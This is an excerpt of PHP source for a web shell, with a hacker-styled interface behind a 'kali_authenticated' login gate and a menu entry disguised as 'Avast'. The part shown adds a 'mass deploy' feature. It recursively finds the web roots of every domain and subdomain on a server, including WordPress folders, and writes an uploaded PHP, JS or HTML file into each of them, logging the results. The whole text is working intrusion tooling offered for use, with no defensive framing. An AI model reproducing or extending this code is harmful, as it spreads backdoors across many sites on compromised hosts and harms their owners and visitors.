...
// ========== RECURSIVE MASS DEPLOY TO ALL SUBDOMAINS (ADDED) ==========
...
function scanAllSubdomainsRecursive($basePath, $depth = 0) {
    $results = [];
    if ($depth > 3 || !@is_dir($basePath)) return $results;
    
    $items = @scandir($basePath);
    if (!$items) return $results;
    
    $skip = ['.', '..', 'cgi-bin', 'logs', 'tmp', 'backup', '.git', 'node_modules', 'cpanel'];
    $webRoots = ['public_html', 'www', 'html', 'htdocs', 'site', 'web', 'httpdocs'];
    ...
    foreach ($items as $item) {
        ...
        foreach ($webRoots as $wr) {
            ...
            if (@is_dir($test)) {
                ...
                $found = true;
                $subs = ['wp-admin', 'wp-content', 'wp-includes', 'admin', 'includes', 'assets'];
                foreach ($subs as $sub) {
                    $subPath = $test . '/' . $sub;
                    if (@is_dir($subPath)) {
        ...
        if (!$found) {
            ...
            foreach (['index.php', 'index.html', 'index.htm'] as $idx) {
                if (@file_exists($full . '/' . $idx)) { $hasIndex = true; break; }
            }
            if ($hasIndex || preg_match('/\.(com|net|org|info|biz|xyz|online|site|ph|io)$/i', $item)) {
                $results[] = ['name' => $item, 'path' => $full, 'type' => 'direct'];
            }
        }
        
        $subResults = scanAllSubdomainsRecursive($full, $depth + 1);
        $results = array_merge($results, $subResults);
    }
    
    $unique = [];
    foreach ($results as $r) { if (!isset($unique[$r['path']])) $unique[$r['path']] = $r; }
    return array_values($unique);
}

function recursiveMassDeployToSubdomains($content, $filename) {
    $deployed = [];
    if (isset($_SERVER['DOCUMENT_ROOT']) && @is_dir($_SERVER['DOCUMENT_ROOT'])) {
        $tf = rtrim($_SERVER['DOCUMENT_ROOT'], '/') . '/' . $filename;
        if (@file_put_contents($tf, $content) !== false) { @chmod($tf, 0644); $deployed[] = ['path' => $tf, 'domain' => 'current_doc_root']; }
    }
    $domainsPath = autoDetectDomainsPath();
    if ($domainsPath) {
        $subs = scanAllSubdomainsRecursive($domainsPath);
        foreach ($subs as $sub) {
            $tf = rtrim($sub['path'], '/') . '/' . $filename;
            $dir = dirname($tf);
            if (!@is_dir($dir)) @mkdir($dir, 0755, true);
            if (@file_put_contents($tf, $content) !== false) { @chmod($tf, 0644); $deployed[] = ['path' => $tf, 'domain' => $sub['name'], 'type' => $sub['type']]; }
        }
    }
    return $deployed;
}

// ========== MASS DEPLOY AJAX HANDLER (ADDED) ==========
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['mass_deploy_action'])) {
    ...
    if ($_POST['mass_deploy_action'] === 'scan') {
        ...
        if ($domainsPath) {
            $subs = scanAllSubdomainsRecursive($domainsPath);
            $resp['success'] = true;
            $resp['data'] = ['base_path' => $domainsPath, 'subdomains' => $subs, 'total' => count($subs)];
            $resp['message'] = 'Found ' . count($subs) . ' subdomains';
        } else { $resp['message'] = 'No domains folder found'; }
        ...
        if ($content !== false) {
            $deployed = recursiveMassDeployToSubdomains($content, $filename);
            $resp['success'] = true;
            $resp['data'] = ['filename' => $filename, 'deployed' => count($deployed), 'deployed_list' => $deployed];
            $resp['message'] = 'Deployed to ' . count($deployed) . ' locations';
        } else { $resp['message'] = 'Failed to read file'; }
    }
...
if (isset($_GET['loader'])) {
    ...
    <body>
        <div class="fullscreen-banner-loader"><img src="https://i.ibb.co/JWzyTRzR/20260508-135857.jpg" alt="bg"></div>
...
if (!isset($_SESSION['kali_authenticated'])) {
    ...
    <body>
        <div class="fullscreen-banner"><img class="banner-img" src="https://i.ibb.co/JWzyTRzR/20260508-135857.jpg" alt="bg"></div>
...
<head>
    ...
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; }
        ...
        .subdomain-list { background: #0a0e1a; border: 1px solid #2e7a3e; border-radius: 4px; padding: 8px; max-height: 200px; overflow-y: auto; font-size: 0.65rem; }
        .subdomain-item { padding: 4px 8px; border-bottom: 1px solid #2e7a3e; color: #8f8; word-break: break-all; }
        ...
        .deploy-log { background: #0a0e1a; border: 1px solid #2e7a3e; border-radius: 4px; padding: 8px; max-height: 150px; overflow-y: auto; font-size: 0.65rem; }
        .deploy-log .success { color: #2ecc71; }
        .deploy-log .error { color: #ff4444; }
        .deploy-log .info { color: #ffaa33; }
        .btn-scan, .btn-deploy { background: #1a3a1a; border: none; padding: 8px 16px; color: #fff; cursor: pointer; border-radius: 4px; margin-top: 5px; }
...
<body>
    ...
    <div class="nav-menu" id="navMenu">
        <div class="nav-top">
            ...
            <div class="nav-item-text" id="navMassDeployBtn"><i class="fas fa-rocket"></i> Avast</div>
    ...
    <div id="massDeployPanel" class="mass-deploy-panel">
        ...
        <div class="mass-deploy-body">
            <button id="scanSubdomainsBtn" class="btn-scan"><i class="fas fa-search"></i> Scan for Subdomains</button>
            <div id="subdomainListContainer" class="subdomain-list" style="display:none;"></div>
            <input type="file" id="massDeployFileInput" accept=".php,.txt,.html,.js">
            ...
            <button id="startMassDeployBtn" class="btn-deploy" disabled><i class="fas fa-rocket"></i> Deploy to All Subdomains</button>
    ...
    (function(){
        ...
        // ========== MASS DEPLOY TO SUBDOMAINS FUNCTIONALITY ==========
        ...
        function openMassDeployPanel() { massDeployPanel.classList.add('show'); subdomainListContainer.style.display = 'none'; deployLogContainer.style.display = 'none'; deployProgressContainer.style.display = 'none'; startMassDeployBtn.disabled = true; }
        ...
        scanSubdomainsBtn?.addEventListener('click', async () => {
            ...
            scanSubdomainsBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Scanning...';
            subdomainListContainer.style.display = 'block';
            subdomainListContainer.innerHTML = '<div class="subdomain-item" style="color:#ffaa33;">Scanning for subdomains...</div>';
            ...
            try {
                ...
                if (result.success && result.data.subdomains) {
                    discoveredSubdomains = result.data.subdomains;
                    subdomainListContainer.innerHTML = `<div class="subdomain-item" style="background:#2a5a2a;">✓ Found ${result.data.total} subdomains:</div>`;
                    discoveredSubdomains.forEach(sd => { subdomainListContainer.innerHTML += `<div class="subdomain-item">📁 ${sd.name} → ${sd.path}</div>`; });
            ...
            scanSubdomainsBtn.innerHTML = '<i class="fas fa-search"></i> Scan for Subdomains';
        });
        ...
        startMassDeployBtn?.addEventListener('click', async () => {
            ...
            if (discoveredSubdomains.length === 0) { showToast('Please scan for subdomains first'); return; }
            
            deployLogContainer.style.display = 'block';
            deployProgressContainer.style.display = 'block';
            deployLogContainer.innerHTML = '<div class="info">Starting deployment...</div>';
            ...
            try {
                ...
                if (result.success) {
                    ...
                    deployLogContainer.innerHTML += `<div class="success">✅ Deployed: ${result.data.deployed} locations</div>`;
                    if (result.data.deployed_list && result.data.deployed_list.length > 0) {
                        deployLogContainer.innerHTML += `<div class="info">📋 Successful:</div>`;
                        result.data.deployed_list.slice(0, 10).forEach(dep => { deployLogContainer.innerHTML += `<div class="success" style="font-size:0.6rem; padding-left:10px;">→ ${dep.domain}: ${dep.path}</div>`; });
                        if (result.data.deployed_list.length > 10) deployLogContainer.innerHTML += `<div class="info">... and ${result.data.deployed_list.length - 10} more</div>`;
                    }
                    deployProgressFill.style.width = '100%';
                    showToast(`Deployed to ${result.data.deployed} locations`);
                } else { deployLogContainer.innerHTML = `<div class="error">❌ ${result.message}</div>`; }
            } catch (error) { deployLogContainer.innerHTML = `<div class="error">Error: ${error.message}</div>`; }
            setTimeout(() => { deployProgressContainer.style.display = 'none'; }, 3000);
        });
